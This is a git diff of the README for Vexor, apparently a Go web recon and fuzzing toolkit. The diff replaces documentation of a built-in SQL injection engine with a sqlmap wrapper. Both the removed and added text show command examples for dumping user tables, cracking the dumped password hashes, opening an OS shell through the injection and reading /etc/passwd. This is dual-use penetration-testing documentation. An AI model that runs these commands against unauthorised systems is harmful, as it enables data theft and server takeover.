@@ -7,7 +7,7 @@
    ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
 ```
 
-**High-Performance Offensive Security Toolkit written in Go**
+**High-Performance Recon & Fuzzing Toolkit written in Go**
 
 [ English ] | [ العربية (Arabic) ](README.ar.md)
 
@@ -16,8 +16,9 @@
 [![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
 [![Release](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
 
-Vexor is a single-binary attack tool for web recon and SQL injection testing.
+Vexor is a single-binary recon and fuzzing toolkit for web security.
 No runtime dependencies, no bloat — just a binary, your wordlists, and a target.
+SQL injection testing is delegated to sqlmap.
 
 ```bash
 # Quick install
@@ -33,8 +34,7 @@ go install github.com/0xseif-code/vexor/cmd/vexor@latest
 | 🔍 **Subdomain** | Domain Reconnaissance | Active DNS Worker-Pool + Passive crt.sh |
 | 📁 **Directory** | Endpoint Discovery | Recursive Scanning + Smart Baseline Filtering |
 | 🎯 **Fuzzing** | Parameter Mining | Multi-position markers (`FUZZ`) + Response Analysis |
-| 💉 **SQLi** | Vulnerability Exploitation | 7 Detection Techniques + WAF Evasion + Automated Enumeration/Dump + Hash Cracking |
-| 🔑 **Hash Crack** | Offline Password Recovery | Auto Type Identifier + Dictionary Worker-Pool Cracker |
+| 💉 **SQLi** | SQL Injection Testing | Wrapper for sqlmap (industry standard) |
 | 💬 **Interactive UX** | Guided Operation | Batch-aware Prompt Engine, Live Progress, Instrumentation Summary |
 | 📚 **Wordlists** | Cache Manager | Auto on-demand SecLists downloader (`~/.vexor/`) |
 
@@ -227,140 +227,74 @@ $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-st
 [+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
 ```
 
-### `sqli` — Detect and exploit SQL injection
+### `sqli` — SQL injection testing
 
-Seven detection techniques across every parameter — boolean, error, time,
-union, stacked, inline, and OOB — followed by full exploitation on the first
-confirmed point. Exploitation is fully automated: `-D ... -T ... --dump` walks
-databases → tables → columns on its own, and recognized password hashes can be
-cracked offline with a built-in dictionary cracker.
+`vexor sqli` is a wrapper around sqlmap — the industry-standard SQL injection
+tool. Vexor does not ship its own SQLi engine.
 
-On error-based MySQL targets the value is read straight out of provoked DBMS
-errors (`EXTRACTVALUE` / `UPDATEXML` / `GTID_SUBSET` / duplicate-key). When a
-WAF blocks raw data-shaped leaks, extraction degrades to a per-condition
-`CASE WHEN` error oracle, so `--dump` still works. Table/column discovery
-falls back to schema-agnostic lookups, GitHub-CLI-style WordPress column sets,
-and common-column brute force when `information_schema` is locked down.
+**Why sqlmap:**
+- Battle-tested across thousands of engagements
+- Supports every DBMS, technique, and injection type
+- Vexor focuses on what it does best: recon and fuzzing
 
-Detection is driven by a **version-aware payload matrix** — 330+ original
-templates spanning MySQL, PostgreSQL, MSSQL, Oracle, SQLite and a generic
-cross-DB bucket across all seven technique families. `--level` (1-5) selects
-payload nuance and `--risk` (1-3) filters destructive vectors; `--dbms` narrows
-the set to one backend. Each base template is expanded through a level-aware
-wrapper engine (quote variants, parenthesization, clause contexts, NUL
-truncation, keyword/whitespace mutations), so a single template yields many
-concrete probes. Run `vexor sqli --matrix` to print the full per-DBMS and
-per-technique coverage summary.
-
-**Depth behavior.** `--level` grows both the selected vector set and its
-wrapper variants: level 1 runs only the highest-probability subset (~15-25
-probes per point); level 3 expands to the full matrix across every version
-branch and clause (>100 probes); levels 4-5 add compact keyword/whitespace
-obfuscations that trade coverage for evasiveness. `--risk` gates destructive
-vectors — risk 1 excludes stacked/OOB/heavy-CPU payloads whenever a lighter
-match exists, while risk 3 admits OR-logic, stacked, and heavy-CPU probes.
+**Requirements:** sqlmap must be installed and on PATH.
 
 ```bash
-# moderate depth: full matrix, no destructive vectors
-vexor sqli -u "https://example.com/page?id=1" --level 3 --risk 1
-
-# maximum depth + aggressive vectors (stacked, OOB, heavy-CPU)
-vexor sqli -u "https://example.com/page?id=1" --level 5 --risk 3 --oob-domain "att.d"
+# Install sqlmap
+sudo apt install sqlmap          # Debian/Kali
+sudo pacman -S sqlmap            # Arch
+pipx install sqlmap              # pipx
 ```
 
 | Flag | Shorthand | Type | Description | Default |
 |---|---|---|---|---|
-| `--url` | `-u` | string | Target URL, e.g. `https://example.com/page?id=1` | |
+| `--url` | `-u` | string | Target URL | |
 | `--request` | `-r` | string | Burp-style raw HTTP request file | |
 | `--param` | `-p` | string | Only test this parameter | |
-| `--technique` | `-t` | string | Technique codes: `B`,`E`,`U`,`S`,`T`,`I`,`O` (combinable, e.g. `BEU`) or a technique name | `all` |
-| `--dbms` | | string | Force DBMS: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
+| `--database` | `-D` | string | Database name | |
+| `--table` | `-T` | string | Table name | |
+| `--column` | `-C` | stringslice | Columns to dump (repeatable) | |
+| `--data` | | string | POST data string | |
+| `--cookie` | | string | HTTP cookie header | |
+| `--headers` | | stringarray | Custom header (repeatable) | |
+| `--proxy` | | string | HTTP/SOCKS5 proxy URL | |
 | `--level` | | int | Test intensity (1-5) | `1` |
 | `--risk` | | int | Payload risk (1-3) | `1` |
-| `--threads` | | int | SQLi concurrency threads | `10` |
-| `--fast` | | bool | Quick pass: level/risk 1, error + union only | `false` |
-| `--matrix` | | bool | Print version-aware payload matrix summary (counts by DBMS/technique) and exit | `false` |
-| `--timeout` | | int | Per-request timeout (seconds) | `8` |
-| `--delay` | | int | Sleep between requests (milliseconds) | `0` |
-| `--retries` | | int | Retries per failed request | `1` |
-| `--batch` | | bool | Run non-interactive; pick defaults for every prompt | `false` |
-| `--tamper` | | stringslice | Tamper scripts, e.g. `space2comment,randomcase` | |
-| `--auto-tamper` | | bool | Fingerprint WAF + use suggested tamper chain | `false` |
-| `--oob-domain` | | string | Domain for OOB (DNS/HTTP) channels | |
+| `--threads` | | int | Concurrent requests | `5` |
+| `--technique` | | string | Techniques: `BEUSTQ` | |
+| `--dbms` | | string | Force DBMS type | |
 | `--dbs` | | bool | Enumerate databases | `false` |
 | `--tables` | | bool | Enumerate tables | `false` |
 | `--columns` | | bool | Enumerate columns | `false` |
-| `--dump` | | bool | Dump table contents | `false` |
-| `--database` | `-D` | string | DB name for `--tables/--columns/--dump` | |
-| `--table` | `-T` | string | Table name for `--columns/--dump` | |
-| `--column` | `-C` | stringslice | Specific columns to dump, repeatable | |
-| `--crack` | | bool | Cracking mode: crack hashes with no extra prompt | `false` |
-| `--no-crack` | | bool | Cracking mode: never crack hashes | `false` |
-| `--os-shell` | | bool | Interactive OS shell via the injection point | `false` |
-| `--read-file` | | string | Read a file from the DB server | |
-| `--write-file` | | string | Write a local file to the DB server | |
-| `--file-dest` | | string | Remote path for `--write-file` | basename |
+| `--dump` | | bool | Dump table entries | `false` |
+| `--current-user` | | bool | Enumerate current DBMS user | `false` |
+| `--current-db` | | bool | Enumerate current database | `false` |
+| `--is-dba` | | bool | Check DBA privileges | `false` |
+| `--passwords` | | bool | Enumerate password hashes | `false` |
+| `--batch` | | bool | Non-interactive mode | `true` |
+| `--random-agent` | | bool | Random HTTP User-Agent | `true` |
+| `--tamper` | | string | Tamper script(s) | |
+| `--forms` | | bool | Parse and test forms | `false` |
+| `--crawl` | | int | Crawl depth | `0` |
+| `--os-shell` | | bool | Interactive OS shell | `false` |
+| `--sql-shell` | | bool | Interactive SQL shell | `false` |
+| `--extra` | | stringslice | Extra args passed directly to sqlmap | |
 
 ```bash
-# Print the version-aware payload matrix summary
-vexor sqli --matrix
+# Basic scan
+vexor sqli -u "https://target.com/page?id=1"
 
-# Basic SQL injection scan
-vexor sqli -u "http://target.com/page.php?id=1"
+# Enumerate databases
+vexor sqli -u "https://target.com/page?id=1" --dbs
 
-# Restrict to error + union techniques on a single parameter
-vexor sqli -u "http://target.com/page.php?id=1" -p id -t "BEU"
+# Dump a table
+vexor sqli -u "https://target.com/page?id=1" -D shop -T users --dump
 
-# Deeper scan: level 3 unlocks OR / order-by / having wrappers
-vexor sqli -u "http://target.com/page.php?id=1" --level 3 --risk 1
+# From a raw request file
+vexor sqli -r request.txt --dump --batch
 
-# Full matrix: level 5 + risk 2 (adds time/heavy vectors), non-interactive
-vexor sqli -u "http://target.com/page.php?id=1" --level 5 --risk 2 --batch
-
-# Automated scan + full data extraction (db -> table -> columns on its own)
-vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
-
-# Dump a table (table resolved automatically if the name is close)
-vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password
-
-# Cracking mode: dump hashes, then answer the crack prompt (or --batch)
-vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users --crack
-vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C password --batch
-
-# Full takeover
-vexor sqli -u "http://target.com/page.php?id=1" --os-shell
-vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
-```
-
-Interactive prompts (DBMS filter, WAF tamper, parameter focus, large-dump
-limits, hash cracking) are auto-answered with sane defaults under `--batch` or
-when stdin is not a terminal.
-
-```text
-$ vexor sqli -u "https://example.com/page?id=1" --level 2
-[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=10)
-URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
-URL query parameter/GET/id technique=error   dbms=mysql confidence=88
-POST form parameter/POST/user technique=time      dbms=mysql confidence=76
-...
-[+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
-[i] fingerprinted DBMS: mysql
-[+] done | requests=412 | elapsed=125.3s | rate=3.3 req/s | phase(detect=125.3s)
-
-$ vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users --crack
-...
-[i] first confirmed injection point: GET/id (boolean)
-id      username        password
-1       admin           *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
-2       bob             *A4B6157319038726FF3A9A4DFFED4DEB
-...
-[+] dumped 2 rows from shop.users (3 columns)
-[*] cracking 2 hash(es) via default 10k passwords
-[*] Cracking hashes: 1/2 solved (50.0%) | Speed: 312 480 H/s
-[*] Cracking finished: 2/2 hashes solved (100.0%) in 412ms (4 940 attempts)
-shop.users: admin | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (admin123)
-shop.users: bob | *A4B6157319038726FF3A9A4DFFED4DEB (bob)
-[+] done | requests=88 | elapsed=9.7s | rate=9.1 req/s | phase(detect=5.2s enum=1.6s dump=2.9s)
+# With tamper and higher level
+vexor sqli -u "https://target.com/page?id=1" --tamper=space2comment --level 3
 ```
 
 ### `update` — Self-update the binary
@@ -417,10 +351,6 @@ $ vexor update-wordlists
   `passwords`, `passwords-large`, `endpoints`.
 - **Custom wordlists** (`-w /path/to/file.txt`): any local file, one word per
   line — overrides the size preset.
-- **Hash cracking** uses the cached `passwords` list by default, or a custom
-  file; the cracker identifies the hash type (MD5, SHA-1, bcrypt, ...) and
-  streams the dictionary through a worker pool, so large wordlists never load
-  entirely into memory.
 
 Output formats are per-scan:
 
